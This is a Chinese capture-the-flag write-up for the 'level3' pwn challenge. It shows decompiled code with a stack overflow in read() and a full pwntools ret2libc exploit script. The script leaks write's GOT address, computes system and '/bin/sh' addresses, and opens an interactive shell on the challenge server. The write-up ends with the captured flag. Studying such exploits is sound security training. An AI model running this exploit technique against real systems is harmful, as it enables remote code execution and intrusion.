附件解压得到：level3和libc_32.so.6两个文件。

# IDA

分析level3程序。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}

ssize_t vulnerable_function()
{
  char buf; // [esp+0h] [ebp-88h]

  write(1, "Input:\n", 7u);
  return read(0, &buf, 0x100u); //存在栈溢出漏洞
}
```

程序中未发现system函数。根据给的`libc_32.so.6`文件，可以知道本题是ret2libc。

大致思路：先栈溢出，调用write函数，获取write函数的got表地址，再执行main函数，然后二次一出，执行system('/bin/sh')。

python脚本：

```python
from pwn import *

context.log_level = 'debug'

sh = remote('111.200.241.244', 60680)
elf = ELF('./level3')
elf_libc =ELF('./libc_32.so.6')

write_plt = elf.plt['write'] #write函数plt地址
write_got = elf.got['write'] #write函数got表地址
main_addr = elf.symbols['main'] #main函数地址
elf_system = elf_libc.symbols['system'] 
elf_write = elf_libc.symbols['write']
sh_rela = elf_write - 0x0015902b # /bin/sh与write函数的地址偏移
sys_rela = elf_write - elf_system # system函数与write函数的地址偏移

sh.recv()

#第一次栈溢出
# p32(write_plt) 覆盖eip，下一个执行的函数 plt - got - write
# p32(main_addr) write函数返回地址，也就是write函数执行完毕，执行main函数。
# p32(1) + p32(write_got)  + p32(4) write函数的三个参数。
payload = b'a' * 140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got)  + p32(4)

sh.sendline(payload)

#获取到write函数的地址。
write_addr = u32(sh.recv()[:4])

sh.recv()

# p32(write_addr - sys_rela) 覆盖eip, 下一个执行函数的地址，也就是system函数
# p32(0) system函数返回值
# p32(write_addr - sh_rela) system函数参数，也就是/bin/sh
payload = b'a' * 140 + p32(write_addr - sys_rela) + p32(0) + p32(write_addr - sh_rela)

sh.sendline(payload)

sh.interactive()
```

得到flag：cyberpeace{78834df84d57a4710d832f58331d9518}

